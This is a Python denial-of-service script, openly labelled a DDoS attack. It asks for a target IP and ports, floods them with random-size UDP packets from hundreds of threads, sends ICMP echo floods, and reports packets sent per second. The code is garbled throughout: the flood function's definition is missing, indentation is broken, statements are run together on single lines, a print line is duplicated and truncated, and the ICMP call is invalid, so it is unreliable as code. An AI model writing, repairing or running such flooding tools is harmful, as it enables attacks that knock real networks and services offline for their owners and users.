import socket
import random
import threading
from scapy.all import *
import os
import time

target_ip = input("Enter target IP: ")
target_ports = list(map(int, input("Enter ports to target, separated by commas (e.g., 80,443,25): ").split(',')))  # Attack configuration

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    
    while True:
        try:
            for port in target_ports:                
                data_size = random.randint(64, 1024)                
                                packet_data = os.urandom(data_size)            
                s.sendto(packet_data, (target_ip, port))                
                packets_sent += 1
            
            # Send additional ICMP echo requests to overwhelm router resources 
            icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)            icmp_socket.setsockopt(socket.SOL_IP, socket.IP_SOURCE_ROUTE,"1")            
            for_ in range(5):                icmp_socket.sendto(icmp.ECHO_REQUEST(target_ip), (target_ip, 33434))            
            attack_num += 1
        except:
            pass

def show_status():    global packets_sent
    
    print(f"\nDDoS Attack Status:")    print(f"Total Packets Sent: {packets_sent}")    print(f"Packets per Second: {(packets_sent / (time.time()
    
    print(f"Packets per Second: {(packets_sent / (time.time() - start_time)):.2f}")start_time = time.time()while True:
    show_status()    
    # Launch UDP flood and ICMP echo request threads
    for i in range(500):        thread = threading.Thread(target=udp_flood)        thread.start()    
    time.sleep(0.1)
